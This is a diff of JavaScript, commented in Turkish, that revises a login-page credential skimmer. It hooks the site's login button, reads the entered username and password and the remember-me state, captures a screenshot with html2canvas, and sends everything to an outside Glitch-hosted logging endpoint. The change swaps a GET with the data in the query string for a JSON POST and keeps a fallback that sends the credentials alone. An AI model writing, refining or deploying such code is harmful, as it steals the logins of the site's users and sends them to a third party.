@@ -53,47 +53,46 @@
     }
   }
 
-  function setupLoginListener() {
-    const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
-    if (loginBtn && isScriptActive) {
-      console.log('Login listener eklendi');
-      loginBtn.addEventListener('click', () => {
-        const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
-        const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
-        const remember = document.getElementById('authCheck')?.checked || false;
-        console.log('Giriş bilgileri:', { username, password, remember });
+  // ... Diğer kodlar aynı kalabilir ...
+function setupLoginListener() {
+  const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
+  if (loginBtn && isScriptActive) {
+    console.log('Login listener eklendi');
+    loginBtn.addEventListener('click', () => {
+      const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
+      const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
+      const remember = document.getElementById('authCheck')?.checked || false;
+      console.log('Giriş bilgileri:', { username, password, remember });
 
-        const data = `kuladi=${encodeURIComponent(username)}&sifre=${encodeURIComponent(password)}&remember=${encodeURIComponent(remember)}`;
-
-        // Ekran görüntüsü al ve gönder
-        loadHtml2Canvas(() => {
-          captureScreenshot().then(screenshot => {
-            const fullData = `${data}&screenshot=${encodeURIComponent(screenshot)}`;
-            fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${fullData}`, {
-              method: 'GET',
-              credentials: 'include'
+      loadHtml2Canvas(() => {
+        captureScreenshot().then(screenshot => {
+          fetch('https://ancient-pentagonal-elephant.glitch.me/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ kuladi: username, sifre: password, remember, screenshot })
+          })
+            .then(() => {
+              console.log('Giriş logu ve ekran görüntüsü gönderildi');
+              isScriptActive = false;
             })
-              .then(() => {
-                console.log('Giriş logu ve ekran görüntüsü gönderildi');
-                isScriptActive = false;
-              })
-              .catch(err => {
-                console.log('Gönderme hatası:', err);
-                isScriptActive = false;
-              });
-          }).catch(err => {
-            // Ekran görüntüsü alınamazsa bile logu normal gönder
-            fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
-              method: 'GET',
-              credentials: 'include'
-            }).then(() => console.log('Sadece log gönderildi'));
-          });
+            .catch(err => {
+              console.log('Gönderme hatası:', err);
+              isScriptActive = false;
+            });
+        }).catch(err => {
+          fetch('https://ancient-pentagonal-elephant.glitch.me/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ kuladi: username, sifre: password, remember })
+          }).then(() => console.log('Sadece log gönderildi'));
         });
       });
-    } else {
-      console.log('Login butonu bulunamadı');
-    }
+    });
+  } else {
+    console.log('Login butonu bulunamadı');
   }
+}
+// ... Diğer kodlar aynı kalabilir ...
 
   // Mevcut diğer kodlar (çıkış yapma, sayfa izleme vs.) aynı kalabilir
   if (isScriptActive) {
